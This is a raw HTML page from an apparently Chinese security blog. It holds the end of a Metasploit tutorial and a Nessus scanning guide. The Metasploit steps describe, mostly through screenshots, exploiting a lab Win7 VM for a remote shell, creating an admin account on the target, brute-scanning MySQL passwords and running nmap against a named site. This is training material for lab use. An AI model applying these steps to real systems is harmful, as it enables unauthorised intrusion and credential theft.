<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805172003858.png" alt="image-20210805172003858"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805172015257.png" alt="image-20210805172015257"></p>
<p>法2：进入模块后直接输入info</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805172134658.png" alt="image-20210805172134658"></p>
<p>步骤3：设置参数/启动</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210805172326733.png" alt="image-20210805172326733"></p>
<h2 id="4-实战-使用msf渗透攻击Win7主机并远程执行命令"><a href="#4-实战-使用msf渗透攻击Win7主机并远程执行命令" class="headerlink" title="4.实战-使用msf渗透攻击Win7主机并远程执行命令"></a>4.实战-使用msf渗透攻击Win7主机并远程执行命令</h2><h4 id="4-1环境介绍"><a href="#4-1环境介绍" class="headerlink" title="4.1环境介绍"></a>4.1环境介绍</h4><p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806101135845.png" alt="image-20210806101135845"></p>
<p>补充：需要自己搭建win7虚拟机</p>
<h4 id="4-2通过msf模块获取Win7远程shell"><a href="#4-2通过msf模块获取Win7远程shell" class="headerlink" title="4.2通过msf模块获取Win7远程shell"></a>4.2通过msf模块获取Win7远程shell</h4><p>流程说明</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806101253627.png" alt="image-20210806101253627"></p>
<p>​                                                            流程图</p>
<p>步骤1：对已知漏洞进行查看</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806101623365.png" alt="image-20210806101623365"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806101730568.png" alt="image-20210806101730568"></p>
<p>步骤2-3：模块查找与配置参数</p>
<p>步骤2.1查看auxiliary漏洞并配置的参数</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806101830245.png" alt="image-20210806101830245"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806102036473.png" alt="image-20210806102036473"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806102155654.png" alt="image-20210806102155654"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806101549498.png" alt="image-20210806101549498"></p>
<p>步骤2.2查看exploit并配置的参数</p>
<p>查找exploit</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806102809076.png" alt="image-20210806102809076"></p>
<p>查找模块与配置参数</p>
<p>加载模块</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806102856366.png" alt="image-20210806102856366"></p>
<p>查看模块</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806103200129.png" alt="image-20210806103200129"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806103431759.png" alt="image-20210806103431759"></p>
<p>步骤2.3查找payload并配置的参数</p>
<p>查找方法1：</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806103807459.png" alt="image-20210806103807459"></p>
<p>查找方法2：</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806103851072.png" alt="image-20210806103851072"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806103920476.png" alt="image-20210806103920476"></p>
<p>设置攻击载荷</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806104017012.png" alt="image-20210806104017012"></p>
<p>查看payload：show options</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806104125770.png" alt="image-20210806104125770"></p>
<p>配置参数</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806104833280.png" alt="image-20210806104833280"></p>
<p>接收者地址（监听者地址）</p>
<p>补充：再次show options查看是否所有参数都配置成功</p>
<p>步骤4：启动/攻击</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806105101774.png" alt="image-20210806105101774"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806105207507.png" alt="image-20210806105207507"></p>
<p>补充：</p>
<p>1.在攻击目标机上创建账号，这里账号与密码都是admin</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806105338594.png" alt="image-20210806105338594"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806105418980.png" alt="image-20210806105418980"></p>
<p>2.解决乱码</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806105543056.png" alt="image-20210806105543056"></p>
<p>3.查看权限</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806105641987.png" alt="image-20210806105641987"></p>
<p>4.退出：ctrl+c</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806105714646.png" alt="image-20210806105714646"></p>
<p>5.渗透成功保存到后台</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806105802990.png" alt="image-20210806105802990"></p>
<p>按回车是不会进入会话，需要查看后台并进入</p>
<p>查看</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806105957409.png" alt="image-20210806105957409"></p>
<p>进入</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806110034282.png" alt="image-20210806110034282"></p>
<p>6.在攻击目标机上保存到后台（进入方法同上）</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806110138031.png" alt="image-20210806110138031"></p>
<p>7.会话操作（终结会话）</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806110350965.png" alt="image-20210806110350965"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806110444230.png" alt="image-20210806110444230"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806110527414.png" alt="image-20210806110527414"></p>
<h2 id="5-实战-使用msf扫描靶机上mysql服务密码"><a href="#5-实战-使用msf扫描靶机上mysql服务密码" class="headerlink" title="5.实战-使用msf扫描靶机上mysql服务密码"></a>5.实战-使用msf扫描靶机上mysql服务密码</h2><h4 id="5-1环境"><a href="#5-1环境" class="headerlink" title="5.1环境"></a>5.1环境</h4><p>启动kali和靶机</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806151606532.png" alt="image-20210806151606532"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806152232078.png" alt="image-20210806152232078"></p>
<h4 id="5-2实战步骤"><a href="#5-2实战步骤" class="headerlink" title="5.2实战步骤"></a>5.2实战步骤</h4><p>步骤1：查找漏洞</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806151928117.png" alt="image-20210806151928117"></p>
<p>步骤2：加载模块</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806152015786.png" alt="image-20210806152015786"></p>
<p>步骤3：修改参数与执行</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806152034883.png" alt="image-20210806152034883"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806152321135.png" alt="image-20210806152321135"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806152335718.png" alt="image-20210806152335718"></p>
<p>步骤4：查看刑具/证明（数据）</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806152538536.png" alt="image-20210806152538536"></p>
<h4 id="5-3将扫描的结果导出Metasploit与导入另外一台Metasploit中"><a href="#5-3将扫描的结果导出Metasploit与导入另外一台Metasploit中" class="headerlink" title="5.3将扫描的结果导出Metasploit与导入另外一台Metasploit中"></a>5.3将扫描的结果导出Metasploit与导入另外一台Metasploit中</h4><p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806152657897.png" alt="image-20210806152657897"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806152817564.png" alt="image-20210806152817564"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806152839548.png" alt="image-20210806152839548"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806153154656.png" alt="image-20210806153154656"></p>
<p>说明：这里没有开第二台Metasploit，但是选择清空了数据库数据</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806153453277.png" alt="image-20210806153453277"></p>
<p>通过hosts查看攻击记录（空）</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806153535935.png" alt="image-20210806153535935"></p>
<p>补充</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806153753152.png" alt="image-20210806153753152"></p>
<p>导入：（这里应该是下面这语句是xml而不是xmk）</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806153651358.png" alt="image-20210806153651358"></p>
<p>删除：</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806153915368.png" alt="image-20210806153915368"></p>
<p>拓展：添加nmap扫描记录</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806154424124.png" alt="image-20210806154424124"></p>
<p>-A：扫描所有类型，</p>
<p>xuegod.cn：目标网站</p>
<p>-oX：o输出，X文件类型，这里表示输出为文件类型</p>
<p>xuegod.xml：输出文件名与类型（没有会新建）</p>
<p>1.导入与查看</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806154634734.png" alt="image-20210806154634734"></p>
<p>2.查看服务</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806154748106.png" alt="image-20210806154748106"></p>
<p>查看特点主机的服务</p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806154825587.png" alt="image-20210806154825587"></p>
<h2 id="6-命令补充"><a href="#6-命令补充" class="headerlink" title="6.命令补充"></a>6.命令补充</h2><p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806154928791.png" alt="image-20210806154928791"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806155015802.png" alt="image-20210806155015802"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806155057118.png" alt="image-20210806155057118"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806155110457.png" alt="image-20210806155110457"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806155120901.png" alt="image-20210806155120901"></p>
<p><img src="/2021/08/15/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/image-20210806155129726.png" alt="image-20210806155129726"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://wgc5.gitee.io/2021/08/04/NESSUS%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="北极星上的稻草人">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="北极星上的稻草人">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/08/04/NESSUS%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/" class="post-title-link" itemprop="url">NESSUS漏洞检测</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-08-04 20:31:48" itemprop="dateCreated datePublished" datetime="2021-08-04T20:31:48+08:00">2021-08-04</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-08-06 17:38:05" itemprop="dateModified" datetime="2021-08-06T17:38:05+08:00">2021-08-06</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">信息安全</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="NESSUS漏洞检测"><a href="#NESSUS漏洞检测" class="headerlink" title="NESSUS漏洞检测"></a>NESSUS漏洞检测</h2><p><img src="/2021/08/04/NESSUS%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/image-20210804103053150.png" alt="image-20210804103053150"></p>
<p><img src="/2021/08/04/NESSUS%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/image-20210804103108664.png" alt="image-20210804103108664"></p>
<h3 id="安装："><a href="#安装：" class="headerlink" title="安装："></a>安装：</h3><p><img src="/2021/08/04/NESSUS%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/image-20210804103131188.png" alt="image-20210804103131188"></p>
<p><img src="/2021/08/04/NESSUS%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/image-20210804103253607.png" alt="image-20210804103253607"></p>
<p>补充：不一定是/etc/init.d/nessused地址，如果你不是root，就不是这个地址。自己文件搜索查看地址（如）</p>
<p><img src="/2021/08/04/NESSUS%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/image-20210806173640700.png" alt="image-20210806173640700"></p>
<p><img src="/2021/08/04/NESSUS%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/image-20210804103355995.png" alt="image-20210804103355995"></p>
<p>补充：谷歌浏览器可能打不开，可以把http协议改为https协议或者直接用360浏览器打开</p>
<p><img src="/2021/08/04/NESSUS%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/image-20210804103738543.png" alt="image-20210804103738543"></p>
<p><img src="/2021/08/04/NESSUS%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/image-20210804103621929.png" alt="image-20210804103621929"></p>
<p>（不要翻译网站，可能会跳转网址）</p>
<p><img src="/2021/08/04/NESSUS%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/image-20210804103908979.png" alt="image-20210804103908979"></p>
<p><img src="/2021/08/04/NESSUS%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/image-20210804104017520.png" alt="image-20210804104017520"></p>
<p>回到这个网站填激活码</p>
<p><img src="/2021/08/04/NESSUS%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/image-20210804104048002.png" alt="image-20210804104048002"></p>
<p><img src="/2021/08/04/NESSUS%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/image-20210804104229941.png" alt="image-20210804104229941"></p>
<p><img src="/2021/08/04/NESSUS%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/image-20210804104259712.png" alt="image-20210804104259712"></p>
<p>激活完成</p>
<h3 id="配置："><a href="#配置：" class="headerlink" title="配置："></a>配置：</h3><p>将刚下载的插件all-2.0.tar.gz上传到kali系统/root下。（这里插件是2.0版本，如果不上传到root下，操作时需要进度该文件存放的地址路径下）</p>
<p><img src="/2021/08/04/NESSUS%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/image-20210804104842801.png" alt="image-20210804104842801"></p>
<p>它会自动检查</p>
<p><img src="/2021/08/04/NESSUS%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/image-20210804104905954.png" alt="image-20210804104905954"></p>
<h3 id="扫描"><a href="#扫描" class="headerlink" title="扫描"></a>扫描</h3><p>登录：</p>
<p><img src="/2021/08/04/NESSUS%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/image-20210804105621814.png" alt="image-20210804105621814"></p>
<p>（英语不好，可以用谷歌浏览器翻译为中文网站使用）</p>
<p><img src="/2021/08/04/NESSUS%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/image-20210804105133629.png" alt="image-20210804105133629"></p>
<p>有众多扫描方式，自己按照自己需求打钩配置即可</p>
<p><img src="/2021/08/04/NESSUS%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/image-20210804105255948.png" alt="image-20210804105255948"></p>
<p>点击可以查看详情</p>
<p><img src="/2021/08/04/NESSUS%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/image-20210804105332136.png" alt="image-20210804105332136"></p>
<p><img src="/2021/08/04/NESSUS%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/image-20210804110120912.png" alt="image-20210804110120912"></p>
<p><img src="/2021/08/04/NESSUS%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/image-20210804110145277.png" alt="image-20210804110145277"></p>
<p><img src="/2021/08/04/NESSUS%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/image-20210804105422683.png" alt="image-20210804105422683"></p>
<p><img src="/2021/08/04/NESSUS%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/image-20210804105444083.png" alt="image-20210804105444083"></p>
<p>如果扫描需要登录的web网站</p>
<p><img src="/2021/08/04/NESSUS%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/image-20210804105905216.png" alt="image-20210804105905216"></p>
<p><img src="/2021/08/04/NESSUS%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/image-20210804105925700.png" alt="image-20210804105925700"></p>
<p>设置好点击保存</p>
<p><img src="/2021/08/04/NESSUS%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/image-20210804110046021.png" alt="image-20210804110046021"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://wgc5.gitee.io/2021/08/04/NMAP%E9%AB%98%E7%BA%A7%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="北极星上的稻草人">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="北极星上的稻草人">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/08/04/NMAP%E9%AB%98%E7%BA%A7%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/" class="post-title-link" itemprop="url">NMAP高级使用技巧</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2021-08-04 10:28:30 / 修改时间：20:33:37" itemprop="dateCreated datePublished" datetime="2021-08-04T10:28:30+08:00">2021-08-04</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
